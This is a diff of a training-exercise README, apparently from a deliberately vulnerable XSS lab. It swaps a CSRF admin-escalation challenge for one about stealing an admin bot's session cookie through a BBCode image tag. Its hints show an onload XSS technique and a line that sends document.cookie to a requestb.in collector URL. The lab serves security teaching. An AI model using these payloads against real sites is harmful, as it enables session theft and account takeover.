@@ -6,13 +6,11 @@ Hey friend,
 
 I have a new concern I'm hoping you can help me with.
 
-My profile signatures were such a hit, I gave them to a friend - a guy who runs another game like mine (based off the same game engine).
+I had a user recently complain to me that his account got hacked. Apparently the hacker found something in my BBCode parser he was able to exploit to do an XSS attack and steal this user's cookie, then login as him.
 
-He told me he got "hacked" - he said he was browsing through user profiles, and came across one that had a link in his profile signature. He clicked the link, and when he went back to the game, he found that user was suddenly an admin! He still has no idea how it happened.
+Can you see if you can duplicate that attack?
 
-Perhaps you could dig into it and shed some light on it? As far as we know, the only way to change a user's status is via the Staff Panel -> Adjust User Level form, which looks like [this](https://github.com/breakthenet/xss-exercises/blob/master/new_staff_actions.php#L1455-L1483).
-
-Just like the previous challenge, I have a phantomjs bot setup that will log in as my admin account and visit all user profiles in the game. Then, for each profile, it will click ANY links in each profile (you can create a link in bbcode with `[url]http://site.com[/url]`. To trigger it, just go to Trigger Admin Browser in the navigation. 
+Just like the previous challenge, I have a phantomjs bot setup that will log in as my admin account and visit all user profiles in the game. To trigger it, just go to Trigger Admin Browser in the navigation. See if you can steal that account's cookies!
 
 Thanks!
 
@@ -24,18 +22,37 @@ Stuck?
 ----------------------
 <details> 
   <summary>Click for hint 1</summary>
-   The simpler way to complete this challenge is to host an html page somewhere else on the internet, and stick a link to it on your profile signature. The admin bot will eventually click on it, and you can trigger your javascript payload on that external site within the context of the admin's browser.
+   BBCode allows you to embed an image like so: [img]http://url.com/image.jpg[/img]
+   
+   Play around with that.
 </details>
 
 <details> 
   <summary>Click for hint 2</summary>
-   There is no CSRF token on the [form used in the admin panel](https://github.com/breakthenet/xss-exercises/blob/master/new_staff_actions.php#L1455-L1483) to update a user's admin status! This means you can try a CSRF attack! Try to get the admin's browser to submit that form for you. In whatever solution you come up with, compare it to the code linked above very closely, since that is what you are trying to emulate. If needed, you can get your user ID from the Explore -> User List page.
+   Try breaking the BBCode image tag by inserting other characters (besides the url) inside of it. Use chrome inspector or view-source on "My Profile" to see what your BBCode input looks like when it's translated into html.
 </details>
 
 <details> 
   <summary>Click for hint 3</summary>
-   Try googling "how to create and submit a form dynamically in javascript". There are some good stackoverflow examples.
+   http://requestb.in/ is a neat site for testing webhooks. Cookie stealing is kind of like a webhook. If you were somehow able to get javascript execution, you could potentially change the SRC of the image to something like this:
+   
+   http://requestb.in/1fj9x6o1?c='+document.cookie
+   
+   And then review the cookie (passed as a GET parameter) on requestb.in!
 </details>
+
+<details> 
+  <summary>Click for hint 4</summary>
+   Did you know you can execute javascript when an image loads? It's simple! All you have to do is use the onLoad attribute, like so:
+   
+   &lt;img src="logo.png" onload="alert(1)"&gt;
+</details>
+
+<details> 
+  <summary>Click for hint 5</summary>
+   While you can edit cookies with plain javascript, you can also cheat and use a browser extension like [this one](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en).
+</details>
+
 
 
 
